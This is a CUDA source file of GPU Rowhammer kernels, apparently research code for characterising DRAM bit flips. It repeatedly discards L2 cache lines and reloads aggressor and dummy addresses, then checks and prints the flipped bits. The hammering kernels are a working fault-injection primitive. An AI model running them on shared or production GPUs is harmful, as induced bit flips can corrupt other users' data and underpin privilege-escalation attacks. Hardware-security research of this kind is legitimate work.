#include <cuda_helpers.cuh>
#include <iostream>

/**
 * @brief Sets the address byte identified by the thread offset to value.
 *
 * @param addr_arr GPU address value
 * @param value 8-bit byte value
 * @param b_len maximum offset
 */
__global__ void set_address_kernel(uint8_t *addr_arr, uint64_t value,
                                   uint64_t b_len)
{
  int offset = threadIdx.x + blockIdx.x * blockDim.x;
  if (offset < b_len)
  {
    asm volatile("{\n\t"
                 "st.u8.global.wt [%0], %1;\n\t"
                 "}" ::"l"(addr_arr + offset),
                 "l"(value));
  }
}

__global__ void clear_address_kernel(uint8_t *addr, uint64_t step)
{
  for (uint64_t i = 0; i < step; i += 128)
    asm volatile("{\n\t"
                 "discard.global.L2 [%0], 128;\n\t"
                 "}" ::"l"(addr));
}

__global__ void verify_result_kernel(uint8_t **addr_arr, uint64_t target,
  uint64_t b_len, bool *has_diff)
{
  uint64_t value;

  int addr_id = (threadIdx.x + blockIdx.x * blockDim.x) / b_len;
  int byte_id = (threadIdx.x + blockIdx.x * blockDim.x) % b_len;
  asm volatile("{\n\t"
                "ld.u8.global.volatile %0, [%1];\n\t"
                "}"
                : "=l"(value)
                : "l"(*(addr_arr + addr_id) + byte_id));

  int diff_count = 0;
  int diff = target ^ value; // XOR
  for (int i = 0; i < 8; i++)
    diff_count += (diff >> i) & 1;

  if (diff_count)
  {
    if (has_diff) *has_diff = true;
    printf("Bit-Flip Location: %d bit at %p\n", diff_count, *(addr_arr + addr_id) + byte_id);
    printf("Expected Pattern: %02lx, Observed Pattern: %02lx\n", target, value);
  }
}

__global__ void evict_kernel(uint8_t *addr, uint64_t size)
{ 
  uint64_t temp, ret = 0;
  uint64_t offset = threadIdx.x * size;

  for (int i = 0 ; i < size; i += 128) {
    asm volatile("{\n\t"
               "ld.u8.global.volatile %0, [%1];\n\t"
               "}"
               : "=l"(temp)
               : "l"(addr + offset + i));
    ret += temp;
  }
  if (threadIdx.x == 0) printf("%ld\n", ret);
}

__global__ void simple_hammer_kernel(uint8_t **addr_arr, uint64_t count,
                                     uint64_t *time)
{
  uint64_t temp __attribute__((unused));
  uint64_t ce, cs;
  uint8_t *addr = *(addr_arr + threadIdx.x);
  cs = clock64();
  for (; count--;)
  {
    asm volatile("{\n\t"
                 "discard.global.L2 [%0], 128;\n\t"
                 "}" ::"l"(addr));
    // clock_start = clock64();
    asm volatile("{\n\t"
                 "ld.u8.global.volatile %0, [%1];\n\t"
                 "}"
                 : "=l"(temp)
                 : "l"(addr));
    // clock_end = clock64();
    // printf("%ld, %ld\n", clock_end - clock_start, temp);
  }
  ce = clock64();
  // if (threadIdx.x == 0){
  //   printf("%ld, %ld\n", ce - cs, temp)
  //   }
  *time = ce - cs;
}

__global__ void single_thread_hammer(uint8_t **addr_arr, uint64_t count, uint64_t n, uint64_t *time)
{
  uint64_t temp __attribute__((unused));
  uint64_t ce, cs;
  cs = clock64();
  for (; count--;)
  {
    for (uint64_t i = 0; i < n; i++)
    {
      asm volatile("{\n\t"
                  "discard.global.L2 [%0], 128;\n\t"
                  "}" ::"l"(addr_arr[i]));
      asm volatile("{\n\t"
                  "ld.u8.global.volatile %0, [%1];\n\t"
                  "}"
                  : "=l"(temp)
                  : "l"(addr_arr[i]));
    }
  }
  ce = clock64();
  *time = ce - cs;
}

__global__ void sync_hammer_kernel(uint8_t **addr_arr, uint64_t count,
                                   uint64_t delay, uint64_t period,
                                   uint64_t *time)
{
  uint64_t temp, ret = 0, ce, cs, i;
  uint8_t *addr = *(addr_arr + threadIdx.x);
  cs = clock64();

  for (; count--;)
  {
    for (i = delay; i--;)
    {
      asm volatile("{\n\t"
                   "add.u64 %0, %1, %2;\n\t"
                   "}"
                   : "=l"(ret)
                   : "l"(ret), "l"(temp));
    }
    for (i = period; i--;)
    {
      asm volatile("{\n\t"
                   "discard.global.L2 [%0], 128;\n\t"
                   "}" ::"l"(addr));
      asm volatile("{\n\t"
                   "ld.u8.global.volatile %0, [%1];\n\t"
                   "}"
                   : "=l"(temp)
                   : "l"(addr));
    }
  }
  ce = clock64();
  *time = ce - cs;
}

__global__ void warp_simple_hammer_kernel(uint8_t **addr_arr, uint64_t count, 
                                          uint64_t n, uint64_t k, uint64_t len, 
                                          uint64_t delay, uint64_t period, 
                                          uint64_t* time)
{
  /* n: warp, k: threads */
  uint64_t ret = 0, temp, cs, ce;
  uint64_t warpId = threadIdx.x / 32;
  uint64_t threadId_in_warp = threadIdx.x % 32;

  if (warpId < n && threadId_in_warp < k && threadId_in_warp + warpId * k < len)
  {
    uint8_t *addr = *(addr_arr + threadId_in_warp + warpId * k);
    // uint8_t *addr = *(addr_arr + warpId);
    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(addr));
    if (threadIdx.x == 0)
      cs = clock64();
    __syncthreads();
    for (;count--;)
    {
      for (uint64_t i = period; i--;){
        asm volatile("{\n\t"
                    "discard.global.L2 [%1], 128;\n\t"
                    "ld.u8.global.volatile %0, [%1];\n\t"
                    "}"
                    : "=l"(temp)
                    : "l"(addr));
        __threadfence_block();
      }
      for (uint64_t i = delay; i--;){
        ret += temp;
      }
    }
    // __threadfence_block();
    __syncthreads();
    if (threadIdx.x == 0)
      ce = clock64();
    __syncthreads();
    if (threadIdx.x == 0){
      printf("%u, %ld, %ld, %ld\n", threadIdx.x, warpId, temp, ret);
             * time = ce - cs;
    }
  }
}

__global__ void rh_threshold_kernel(uint8_t **agg_arr, uint8_t **dum_arr, 
                                    uint64_t count, uint64_t n, uint64_t k, 
                                    uint64_t len, uint64_t delay, uint64_t period,
                                    uint64_t* time, 
                                    uint64_t agg_period, uint64_t dum_period)
{
  /* n: warp, k: threads */
  uint64_t ret = 0, temp, cs, ce;
  uint64_t warpId = threadIdx.x / 32;
  uint64_t threadId_in_warp = threadIdx.x % 32;

  if (warpId < n && threadId_in_warp < k && threadId_in_warp + warpId * k < len)
  {
    uint8_t *agg = *(agg_arr + threadId_in_warp + warpId * k);
    uint8_t *dum = *(dum_arr  + threadId_in_warp + warpId * k);

    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(agg));
    asm volatile("{\n\t"
               "discard.global.L2 [%0], 128;\n\t"
               "}" ::"l"(dum));

    if (threadIdx.x == 0)
      cs = clock64();
    __syncthreads();

    for (;count--;)
    {
      // Access agg
      for (uint64_t j = agg_period; j--;){
        for (uint64_t i = period; i--;){
          asm volatile("{\n\t"
                      "discard.global.L2 [%1], 128;\n\t"
                      "ld.u8.global.volatile %0, [%1];\n\t"
                      "}"
                      : "=l"(temp)
                      : "l"(agg));
          __threadfence_block();
        }
        for (uint64_t i = delay; i--;){
          ret += temp;
        }
      }
      // Access dummy
      for (uint64_t j = dum_period; j--;){
        for (uint64_t i = period; i--;){
          asm volatile("{\n\t"
                      "discard.global.L2 [%1], 128;\n\t"
                      "ld.u8.global.volatile %0, [%1];\n\t"
                      "}"
                      : "=l"(temp)
                      : "l"(dum));
          __threadfence_block();
        }
        for (uint64_t i = delay; i--;){
          ret += temp;
        }
      }
    }

    __syncthreads();
    if (threadIdx.x == 0)
      ce = clock64();
    __syncthreads();
    if (threadIdx.x == 0){
      printf("%u, %ld, %ld, %ld\n", threadIdx.x, warpId, temp, ret);
             * time = ce - cs;
    }
  }
}
